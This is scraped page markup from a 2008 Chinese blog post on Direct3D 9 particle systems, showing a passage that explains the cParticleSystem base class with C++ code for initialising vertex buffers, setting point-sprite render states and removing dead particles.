itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="D3D中的粒子系统（2）"><meta itemprop=description content='14.2粒子系统的组成  粒子系统是粒子的集合，用来保存和显示这些粒子。粒子系统维护所有粒子的全部属性，影响系统中的所有粒子：粒子的尺寸，起始的位置及应用在粒子上的纹理等。粒子系统的方法负责更新、显示、杀死和创建粒子。  虽然不同的具体（与抽象是相对的）粒子系统有不同的行为，我们归纳并找到一些所有的粒子系统共有的基本属性，我们把这些公共的属性放到一个抽象的cParticleSystem基类，它是我们所有的具体粒子系统的父类，现在让我们看一下cParticleSystem类：&nbsp;&nbsp;&nbsp; class cParticleSystem&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp; protected:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IDirect3DDevice9*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXVECTOR3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_origin;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cBoundingBox&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_bounding_box;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_emit_rate;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // rate new particles are added to system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_size;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // size of particles&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IDirect3DTexture9*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_texture;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IDirect3DVertexBuffer9*&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list<sParticleAttribute>&nbsp;&nbsp;&nbsp; m_particles;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_max_particles;&nbsp;&nbsp;&nbsp; // max allowed particles system can have&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // following three data elements used for rendering the particle system efficiently&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD&nbsp;&nbsp;&nbsp; m_vb_num;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // particle number in vertex buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD&nbsp;&nbsp;&nbsp; m_vb_offset;&nbsp;&nbsp;&nbsp; // offset in vertex buffer to lock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD&nbsp;&nbsp;&nbsp; m_vb_batch_num;&nbsp;&nbsp;&nbsp; // number of vertices to lock starting at m_vb_offset&nbsp;&nbsp;&nbsp; public:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cParticleSystem();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual ~cParticleSystem();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual bool init(IDirect3DDevice9*&nbsp;&nbsp;&nbsp; device, const char* texture_filename);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void reset();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // sometimes we don&#39;t want to free the memory of a dead particle, but rather respawn it instead.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void reset_particle(sParticleAttribute* particl_attr) = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void add_particle();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void update(float time_delta) = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void pre_render();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void render();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void post_render();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool is_empty();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool is_dead();&nbsp;&nbsp;&nbsp; protected:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void remove_dead_particles();&nbsp;&nbsp;&nbsp; };  一些数据成员：  ·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_origin—粒子系统的原点， 这是粒子系统产生时的位置。  ·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_bounding_box—创建粒子系统使用的边界盒，用于限制粒子的活动范围。例如，假如我们让雪系统只落在一个围绕高山的峰顶的体积内,我们会定义一个包括这个体积的边界盒, 出界的粒子将会被杀死。  ·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_emit_rate—新增加到系统中的粒子的速度。通常的标准是每秒。  ·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_size—系统中所有粒子的尺寸。  ·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_particles—系统中粒子属性的一个列表。 我们用这个列表创建，释放及更新粒子。 当我们准备画粒子时, 我们COPY列表节点的一部分到顶点缓存并画粒子，同时我们COPY另外一批粒子，然后重复这一过程直到绘制完所有粒子。  ·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_max_particles—在给定的时间内，系统中允许的粒子最大数。例如,如果创建粒子的速度比释放快的话, 随着时间的增长粒子的数量将会是巨大的，这个成员将避免出现这样的问题。  ·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_num—在给定的时间内顶点缓存中能够保存的粒子的数量，这个值与实际的粒子系统中的粒子数量无关。  注意：m_vb_offset和m_vb_batch_num数据成员在渲染粒子系统时使用，我们在稍后讨论。  方法：  cParticleSystem/ ~cParticleSystem—用来初始化默认值和用来释放设备接口 (vertex buffer, texture)。&nbsp;&nbsp;&nbsp; cParticleSystem::cParticleSystem()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = NULL;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer = NULL;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_texture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = NULL;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; cParticleSystem::~cParticleSystem()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safe_release<IDirect3DVertexBuffer9*>(m_vertex_buffer);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safe_release<IDirect3DTexture9*>(m_texture);&nbsp;&nbsp;&nbsp; }  init—这个方法做与设备无关的初始化工作,比如创建用来保存点精灵的顶点缓存或创建纹理。 &nbsp;&nbsp;&nbsp; bool cParticleSystem::init(IDirect3DDevice9* device, const char* texture_filename)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Vertex buffer&#39;s number does not equal the number of particles in our system.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // We use the vertex buffer to draw a portion of our particles at a time.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // The arbitrary number we choose for the vertex buffer is specified by the m_vb_num variable.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device = device;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HRESULT hr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hr = device->CreateVertexBuffer(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_num * sizeof(sParticle),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DUSAGE_DYNAMIC | D3DUSAGE_POINTS | D3DUSAGE_WRITEONLY,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PARTICLE_FVF,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DPOOL_DEFAULT,&nbsp;&nbsp;&nbsp; // D3DPOOL_MANAGED can&#39;t be used with D3DUSAGE_DYNAMIC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;m_vertex_buffer,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NULL);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(FAILED(hr))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "CreateVertexBuffer() - FAILED", "ParticleSystem", MB_OK);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hr = D3DXCreateTextureFromFile(device, texture_filename, &amp;m_texture);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(FAILED(hr))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "D3DXCreateTextureFromFile() - FAILED", "ParticleSystem", MB_OK);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;&nbsp;&nbsp;&nbsp; }  o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意： 我们使用动态的顶点缓存（D3DUSAGE DYNAMIC）。 因为我们需要在每帧中更新我们的粒子,意思是我们将会去存取顶点缓存的内存，回想一下，访问一个静态的顶点缓存慢得不可接受， 所以我们使用动态的顶点缓存。  o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 查看我们用过的 D3DUSAGE_POINTS标记,它说明顶点缓存将保存点精灵。  o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 顶点缓存的尺寸是由m_vb_num预先确定的，而且与系统中粒子的数量无关。 也就是说, m_vb_num将小于等于系统中粒子的数量。 这是因为渲染粒子系统是一批一批的，不是一次渲染全部。  o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们使用默认的内存池(pool)代替通常使用的托管内存池，因为动态顶点缓存不能用在托管内存池中。  reset—这个方法重新设置系统中每个粒子的属性:&nbsp;&nbsp;&nbsp; void cParticleSystem::reset()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list<sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reset_particle(&(*iter));&nbsp;&nbsp;&nbsp; }  reset_particle—这个方法重新设置粒子的属性。如何重设粒子的属性，这依赖于具体粒子系统的特性。因此我们定义这个方法为虚拟的，等待子类去实现。   add_particle—这个方法用来在系统中增加一个粒子。在增加它到粒子列表之前，使用reset_particle方法先初始化粒子:&nbsp;&nbsp;&nbsp; void cParticleSystem::add_particle()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sParticleAttribute attr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reset_particle(&amp;attr);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_particles.push_back(attr);&nbsp;&nbsp;&nbsp; }  update—这个方法更新系统中所有的粒子。因为这个的方法的执行取决于具体粒子系统的特性,因此我们定义这个方法为抽象的，等待子类去实现。  render—这个方法用来显示系统中所有的粒子。  pre_render—用它来初始化渲染状态，在渲染前设置。 因为系统与系统之间是不同的,所以我们定义它为虚拟的。 默认将执行下列代码:&nbsp;&nbsp;&nbsp; void cParticleSystem::pre_render()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_LIGHTING,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FALSE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSPRITEENABLE, TRUE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALEENABLE,&nbsp; TRUE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSIZE,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float_to_dword(m_size));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSIZE_MIN,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float_to_dword(0.0f));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // control the size of the particle relative to distance&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALE_A,&nbsp;&nbsp;&nbsp; float_to_dword(0.0f));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALE_B,&nbsp;&nbsp;&nbsp; float_to_dword(0.0f));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALE_C,&nbsp;&nbsp;&nbsp; float_to_dword(1.0f));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // use alpha from texture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetTextureStageState(0, D3DTSS_ALPHAARG1, D3DTA_TEXTURE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetTextureStageState(0, D3DTSS_ALPHAOP,&nbsp;&nbsp;&nbsp; D3DTOP_SELECTARG1);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_ALPHABLENDENABLE, TRUE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_SRCBLEND,&nbsp; D3DBLEND_SRCALPHA);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_DESTBLEND, D3DBLEND_INVSRCALPHA);&nbsp;&nbsp;&nbsp; }  &nbsp; 注意：我们使用alpha混合渲染，以便设置纹理的alpha通道，来设置纹理像素的透明，用它产生多种效果。一种特殊的情况是：获得象纹理那样的非矩形的粒子。例如，获得一个圆形“雪球形”的粒子,我们使用一个简单的带有alpha通道的纹理，它看上去是背景为黑色的带有白色圆形的样子。因此，显示出来时只是一个白圆，这比白色的矩形纹理要好。   post_render—用它去保存所有渲染状态。因为系统与系统间是不同的,所以我们定义它为虚拟的。默认将执行下列代码:&nbsp;&nbsp;&nbsp; void cParticleSystem::post_render()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_LIGHTING, TRUE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSPRITEENABLE, FALSE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALEENABLE,&nbsp; FALSE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_ALPHABLENDENABLE,&nbsp; FALSE);&nbsp;&nbsp;&nbsp; }   is_empty—如果为True则在当前的系统中没有粒子， 否则为false.&nbsp;&nbsp;&nbsp; bool cParticleSystem::is_empty()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return m_particles.empty();&nbsp;&nbsp;&nbsp; }  is_dead—如果为True则系统中的所有粒子都是死的，否则为false。 &nbsp;&nbsp;&nbsp; bool cParticleSystem::is_dead()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list<sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Is there at least one living particle? If yes, the system is not dead.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(iter->is_alive)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // No living particles found, the system must be dead.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;&nbsp;&nbsp;&nbsp; }  remove_dead_particles—搜索属_particle性表，从表中杀死并删除粒子。&nbsp;&nbsp;&nbsp; void cParticleSystem::remove_dead_particles()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list<sParticleAttribute>::iterator iter = m_particles.begin();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(iter != m_particles.end())&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! iter->is_alive)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // erase returns the next iterator, so no need to increment to the next one ourseleves.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iter = m_particles.erase(iter);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iter++;&nbsp;&nbsp;&nbsp; // next in list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }'></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/d3d-particle-system-2/ itemprop=url class=post-title-link>D3D中的粒子系统（2）</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年04月04日 20:06:00 CST" itemprop="dateCreated datePublished" datetime="2008-04-04 20:06:00 +0800 +0800">2008年04月04日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/gamedev/ itemprop=url rel=index><span itemprop=name>dev/GameDev</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/d3d-particle-system-2/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>14.2粒子系统的组成<p>粒子系统是粒子的集合，用来保存和显示这些粒子。粒子系统维护所有粒子的全部属性，影响系统中的所有粒子：粒子的尺寸，起始的位置及应用在粒子上的纹理等。粒子系统的方法负责更新、显示、杀死和创建粒子。<p>虽然不同的具体（与抽象是相对的）粒子系统有不同的行为，我们归纳并找到一些所有的粒子系统共有的基本属性，我们把这些公共的属性放到一个抽象的cParticleSystem基类，它是我们所有的具体粒子系统的父类，现在让我们看一下cParticleSystem类：<br>&nbsp;&nbsp;&nbsp; class cParticleSystem<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; protected:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IDirect3DDevice9*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXVECTOR3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_origin;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cBoundingBox&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_bounding_box;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_emit_rate;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // rate new particles are added to system<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_size;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // size of particles<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IDirect3DTexture9*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_texture;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IDirect3DVertexBuffer9*&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list&lt;sParticleAttribute>&nbsp;&nbsp;&nbsp; m_particles;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_max_particles;&nbsp;&nbsp;&nbsp; // max allowed particles system can have<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // following three data elements used for rendering the particle system efficiently<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD&nbsp;&nbsp;&nbsp; m_vb_num;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // particle number in vertex buffer<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD&nbsp;&nbsp;&nbsp; m_vb_offset;&nbsp;&nbsp;&nbsp; // offset in vertex buffer to lock<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD&nbsp;&nbsp;&nbsp; m_vb_batch_num;&nbsp;&nbsp;&nbsp; // number of vertices to lock starting at m_vb_offset<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cParticleSystem();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual ~cParticleSystem();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual bool init(IDirect3DDevice9*&nbsp;&nbsp;&nbsp; device, const char* texture_filename);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void reset();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // sometimes we don't want to free the memory of a dead particle, but rather respawn it instead.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void reset_particle(sParticleAttribute* particl_attr) = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void 